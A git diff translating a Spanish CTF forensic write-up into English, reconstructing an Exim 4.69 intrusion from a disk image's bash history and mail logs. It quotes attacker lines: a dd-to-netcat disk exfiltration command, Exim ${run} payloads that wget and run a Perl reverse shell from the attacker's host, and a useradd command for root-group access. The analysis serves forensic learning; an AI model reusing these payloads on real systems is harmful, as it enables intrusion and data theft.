@@ -8,43 +8,43 @@ beforetoc: ""
 toc: false
 tags: [ CTF, Intrusion, CVE, BufferOverflow, SMTP ]
 ---
-Reto de ctf sobre una intrusion a un sistema
+CTF challenge about a system intrusion
 
-#### Descripcion:
+#### Description:
 
-  Un conocido nos ha facilitado una imagen de disco de un servidor que considera
-            “está haciendo cosas raras”.
-  Desde el laboratorio de INCIBE hemos visto que había
-            “algo raro” con algún programa.
-  Necesitamos una segunda opinión de un experto. 
+  An acquaintance has provided us with a disk image of a server that he considers to be
+            "is doing strange things".
+  From the INCIBE laboratory, we have seen that there was
+            "something strange" with some program.
+  We need a second opinion from an expert. 
 
-#### ¿Nos ayudas a identificar la aplicación vulnerable?
+#### Can you help us identify the vulnerable application?
 - File: DiscoS.zip
-- Contraseña:  Gr33n2015## 
+- Password: Gr33n2015## 
 
 ---
 
 # Table of Contents
-1. [Extrayendo el zip](#extraerzip)
-2. [Montar la imagen](#montarimg)
-3. [Analizar historial comandos](#analizarcomandos)
-4. [Analizando aplicacion maliciosa](#appmaliciosa)
-5. [Logs corruptos](#logscorruptos)
+1. [Extracting the zip](#extractingthezip)
+2. [Mount the image](#mountimg)
+3. [Analyze command history](#analyzecommands)
+4. [Analyzing malicious application](#maliciousapp)
+5. [Corrupted logs](#corruptedlogs)
 
 
 ---
-<a name="extraerzip"></a>
-### 1- Extrayendo el zip
-Descargamos DiscoS.zip y lo extraemos usando la contraseña que nos ofrecen
+<a name="extractingthezip"></a>
+### 1- Extracting the zip
+Download DiscoS.zip and extract it using the provided password
 
 ```bash
 unzip discoS.zip
 ```
 ![unzip](https://user-images.githubusercontent.com/47476901/151601581-c8a5e5b8-d5ca-48f0-bed3-784c8587ee69.png)
 
-<a name="montarimg"></a>
-### 2- Montar la imagen
-Nos extrae una imagen, montaremos esta imagen en una carpeta para ver lo que contiene.
+<a name="mountimg"></a>
+### 2- Mount the image
+It extracts an image, we will mount this image in a folder to see what it contains.
 
 ```bash
 mkdir disco
@@ -52,18 +52,18 @@ sudo mount discoS.img disco
 ```
 ![mount](https://user-images.githubusercontent.com/47476901/151601607-9c2dfb92-f96d-4793-b7d6-42c71a9af47a.png)
 
-<a name="analizarcomandos"></a>
-### 3- Analizar historial comandos
-Anteriormente nos indicaron que esta imagen del sistema tiene algo raro, puede que sea algo malicioso, para ello comprobaremos si accedieron al usuario root y si es así que podamos ver que comandos ejecutaron como usuario administrador.
+<a name="analyzecommands"></a>
+### 3- Analyze command history
+Previously we were told that this system image has something strange, it may be something malicious, for this we will check if they accessed the root user and if so we can see what commands they executed as administrator user.
 
 ```bash
 cat root/.bash_history
 ```
 ![bash_history](https://user-images.githubusercontent.com/47476901/151601626-071bcd58-4727-430e-b672-ae151a8816f6.png)
 
-### ¿Que hizo el atacante como administrador?
+### What did the attacker do as an administrator?
 <br>
-**1- Elimina el programa exim del sistema**
+**1- Removes the exim program from the system**
 
 ```bash
 apt-get remove exim4
@@ -76,7 +76,7 @@ apt-get remove exim
 dpkg -l | grep exim
 ```
 
-**2- Comprueba en que ruta se encuentra, crea una carpeta llamada exim4 y la abre.**
+**2- Check in which path it is located, create a folder called exim4 and open it.**
 
 ```bash
 pwd
@@ -84,16 +84,16 @@ mkdir exim4
 cd exim4/
 ```
 
-**3- Con el comando scp copia todos los archivos mediante ssh del host del atacante en la nueva carpeta**
+**3- With the command scp copy all files via ssh from the attacker's host to the new folder**
 
 ```bash
 scp yom@192.168.56.1:/home/yom/temporary/exim4/* .
 ```
 
-**4- Instala los paquetes vulnerables de exim que se descargó desde su maquina remotamente.**
+**4- Install the vulnerable exim packages that were downloaded from your machine remotely.**
 
-<li>Esta version de Exim tiene una vulnerabilidad critica</li>
-<li>Exim 4.69 Remote Code Execution via Buffer overflow (Desbordar la memoria)</li>
+<li>This version of Exim has a critical vulnerability.</li>
+<li>Exim 4.69 Ejecución remota de código mediante desbordamiento del búfer (Desbordar la memoria)</li>
 
 ```bash
 dpkg -i exim4_4.69-9_all.deb 
@@ -104,27 +104,27 @@ dpkg -i exim4-base_4.69-9_i386.deb
 dpkg -i exim4-daemon-light_4.69-9_i386.deb 
 ```
 
-**5- Una vez instalados todos los paquetes vulnerables, sale de la carpeta y la elimina.**
+**5- Once all vulnerable packages are installed, exit the folder and delete it.**
 
 ```bash
 cd ..
 rm -rf exim4/
 ```
 
-**6- Detiene todos las operaciones de la CPU con el comando halt.**
+**6- Stops all CPU operations with the halt command.**
 
-<li>Se usa para indicar al hardware que detenga todas las funciones de la CPU.</li>
+<li>It is used to instruct the hardware to stop all CPU functions.</li>
 
-<li>Es decir, reinicia o detiene el sistema</li>
+<li>That is, it restarts or stops the system.</li>
 
 
-**7- Instala el programa OpenSSH cifra las conexiones a traves de la red. (alternativa al SSH)**
+**7- Install the OpenSSH program to encrypt connections over the network (alternative to SSH).**
 ```bash
 apt-get install openssh-server
 apt-get install openssh-server
 ```
 
-**8- Configura el servidor de correo vulnerable y reinicia el sistema.**
+**8- Configure the vulnerable mail server and reboot the system.**
 
 ```bash
 cd /etc/exim4/
@@ -135,10 +135,10 @@ halt
 reboot
 ```
 
-**9- Busca las rutas de los binarios gcc, memdump.**
-<li>No tiene el binario memdump instalado, lo instala</li>
-<li>memdump hace un volcado de memoria</li>
-<li>gcc es un compilador</li>
+**9- Find the paths to the gcc, memdump binaries.**
+<li>You do not have the memdump binary installed, install it.</li>
+<li>memdump does a memory dump</li>
+<li>gcc is a compiler</li>
 
 ```bash
 whereis gcc
@@ -147,18 +147,18 @@ apt-get install memdump
 halt
 ```
 
-**10- Comprueba si tiene conexion con su maquina dentro de la red**
+**10- Check if you have a connection to your machine within the network.**
 
 ```bash
 ifconfig 
 ping 192.168.56.1
 ```
 
-**11- Robando datos**
-<li>El comando dd es una herramienta muy poderosa, limpia, verifica, destruye, duplica datos.</li>
-<li>Copió la partición a traves de una conexion usando netcat</li>
-<li>Lo que hizo fue que todo el contenido de la particion se mandase a traves de esa conexion.</li>
-<li>El atacante ubicado en la 192.168.56.1 se puso a la escucha por ese puerto desde su maquina y redirigió todo ese output a su maquina haciendo asi una copia de particiones a traves de la red.</li>
+**11- Stealing data**
+<li>The dd command is a very powerful tool, it cleans, verifies, destroys, duplicates data.</li>
+<li>Copied the partition over a connection using netcat</li>
+<li>What it did was that all the contents of the partition were sent over that connection.</li>
+<li>>The attacker located at 192.168.56.1 listened on that port from your machine and redirected all that output to your machine, thus making a copy of partitions across the network.</li>
 
 ```bash
 mount
@@ -167,45 +167,44 @@ dd if=/dev/sda | nc 192.168.56.1 4444
 dd if=/dev/sda1 | nc 192.168.56.1 4444
 ```
 
-**12- Recuperando los datos transferidos.**
-<li>El atacante instala 2 herramientas forenses para recuperar datos de esas particiones que se hayan podido volver corruptos.</li>
+**12- Retrieving transferred data**
+<li>The attacker installs 2 forensic tools to recover data from these partitions that may have become corrupted.</li>
 
 ```bash
 apt-get install ddrescue
 apt-get install dcfldd
 ```
 <br>
-<a name="appmaliciosa"></a>
-### 4- Analizando aplicacion maliciosa
+<a name="maliciousapp"></a>
+### 4- Analyzing malicious application
 
-Ya hemos visto que la aplicacion maliciosa es exim, un servicio de transferencia de correo.
+We have already seen that the malicious application is exim, a mail transfer service.
 
-La version 4.69 de Exim contiene una vulnerabilidad critica.
+Exim version 4.69 contains a critical vulnerability.
 
-Descubierta en 2011, fue una de las principales causas de botnets de ese momento.
+Discovered in 2011, it was one of the main causes of botnets at the time.
 
-Al enviar un mensaje especialmente diseñado, un atacante puede corromper el heap y ejecutar código arbitrario con los privilegios del usuario Exim (CVE-2010-4344) causando el buffer overflow (desbordamiento de la memoria).
+By sending a specially crafted message, an attacker can corrupt the heap and execute arbitrary code with the privileges of the Exim user (CVE-2010-4344) causing buffer overflow.
 
+<li>An additional vulnerability, (CVE-2010-4345), was also used, this was the attack that led to the discovery that there was an intruder on the system.</li>
 
-<li>También se utilizó una vulnerabilidad adicional, (CVE-2010-4345), este fue el ataque que condujo al descubrimiento de que habia un intruso en el sistema.</li>
+<li>This bug allows a local user to obtain root privileges from the Exim account (account running the mail service). </li>
 
-<li>Este error permite que un usuario local obtenga privilegios de root desde la cuenta de Exim (cuenta que corre el servicio de correos). </li>
+<li>If the Perl interpreter is on the remote system the exploit will be performed, this module will also automatically exploit the secondary error to obtain the root.</li>
 
-<li>Si el intérprete de Perl se encuentra en el sistema remoto la explotacion se realizará, este módulo también explotará automáticamente el error secundario para obtener el root.</li>
-
-Por eso este fallo del sistema fue tan grave, juntando asi un RCE y un LPE causando tal desastre. 
+That is why this system failure was so serious, bringing together an RCE and an LPE and causing such a disaster. 
 <br><br>
 <b> - RCE: CVE-2010-4344</b><br>
 <b> - LPE: CVE-2010-4345</b> 
 
-Exploits y mas info: <a href="https://eromang.zataz.com/2010/12/20/exim-4-69-remote-code-execution/" target="_blank">EXIM 4.69 RCE</a>
+Exploits and more info: <a href="https://eromang.zataz.com/2010/12/20/exim-4-69-remote-code-execution/" target="_blank">EXIM 4.69 RCE</a>
 
-Dejo un video de como se explota este fallo de seguridad, usando un modulo de metasploit:
+I leave a video of how to exploit this security flaw, using a metasploit module:
 <a href="https://www.youtube.com/watch?v=DnSgOGIxjaQ" target="_blank">https://www.youtube.com/watch?v=DnSgOGIxjaQ</a>
 <br>
-<a name="logscorruptos"></a>
-### 5- Logs corruptos
-Una vez conocemos como ha ocurrido todo esto observamos los logs, que fue la principal fuente de explotacion.
+<a name="corruptedlogs"></a>
+### 5- Corrupted Logs
+Once we know how all this happened we look at the logs, which was the main source of exploitation.
 
 ```bash
 ls var/log/exim4
@@ -222,13 +221,13 @@ cat var/log/exim4/rejectlog
 
 ![BufferOverflow](https://user-images.githubusercontent.com/47476901/151601700-7197f48d-cdb2-4418-9454-f7170a103ef7.png)
 
-Intentaba descargar el archivo realizando el desbordamiento y una de las peticiones fue realizada correctamente, una vez se descargó el archivo perl de su maquina de atacante, lo ubicaba en tmp como usuario exim y lo ejecutó como ese usuario.
+He tried to download the file by performing the overflow and one of the requests was successful, once the perl file was downloaded from his attacker's machine, he placed it in tmp as user exim and executed it as that user.
 
 ```bash
 cat var/log/exim4/mainlog
 ```
 
-Este binario perl realiza una conexion por sockets creando asi una sesion remota del ordenador victima al atacante.
+This perl binary performs a socket connection creating a remote session from the victim computer to the attacker.
 
 ```bash
 ${run{/bin/sh -c "exec /bin/sh -c 'wget http://192.168.56.1/c.pl -O /tmp/c.pl;perl /tmp/c.pl 192.168.56.1 4444; sleep 1000000'"}}
@@ -236,10 +235,10 @@ ${run{/bin/sh -c "exec /bin/sh -c 'wget http://192.168.56.1/c.pl -O /tmp/c.pl;pe
 ![perlreverse](https://user-images.githubusercontent.com/47476901/151601733-346e564f-5970-4da6-aeb8-1daae6426961.png)
 
 
-Exploit de perl que realiza una reverse shell al ordenador (exploit que se ejecuta en exim para conectarse al ordenador remotamente como usuario root):
+Perl exploit that performs a reverse shell to the computer (exploit that runs in exim to connect to the computer remotely as root user):
 
-<li>Este es el Remote Code Execution</li>
-<b> La forma en la que se conectó el atacante</b>
+<li>This is the Remote Code Execution</li>
+<b>The way in which the attacker was connected</b>
 
 ![binarioperl](https://user-images.githubusercontent.com/47476901/151601751-a0c87d38-57af-4380-8b27-d8626a8fbc3c.png)
 
@@ -247,24 +246,24 @@ Exploit de perl que realiza una reverse shell al ordenador (exploit que se ejecu
 cat var/log/exim4/mainlog
 ```
       
-Crea un nuevo usuario que este en el grupo de administador con una contraseña hasheada en md5.
+Create a new user that is in the admin group with an md5 hashed password.
 
-<li> Este es el Local Privilege Escalation<br></li>
-**La forma en la que se convierte en root**
+<li>This is the Local Privilege Escalation<br></li>
+**How to become root**
 
 ```bash
 ${run{/bin/sh -c "exec /bin/sh -c 'useradd --gid root --create-home --password  0 0mkpasswd -H md5 Ulyss3s) ulysses'"}} 
 ```
 
-![crearusuario](https://user-images.githubusercontent.com/47476901/151601768-cab31bd9-4515-4174-bcf1-7ec1df3979df.png)
+![createusuario](https://user-images.githubusercontent.com/47476901/151601768-cab31bd9-4515-4174-bcf1-7ec1df3979df.png)
 
 
-En tmp podemos observar como esta el fichero <b>c.perl</b> (el cual generaba esa conexion),
-y un archivo comprimido llamado <b>rk.tar</b>
+In tmp we can see how the file is <b>c.perl</b> (which generated that connection),
+and a compressed file named  <b>rk.tar</b>
 
 ![tmpfiles](https://user-images.githubusercontent.com/47476901/151601785-d6662d80-4c74-4a1a-9d95-ded5142f1266.png)
 
 
-Analizando el archivo rk, nos damos cuenta de que se trata de un rootkit, el cual genera una puerta trasera al sistema usando iptables y demas cosas.
+Analyzing the rk file, we realize that it is a rootkit, which generates a backdoor to the system using iptables and so on.
 
 ![rootkit](https://user-images.githubusercontent.com/47476901/151602060-d4c88931-3218-4611-8a43-ff6eddf33892.png)
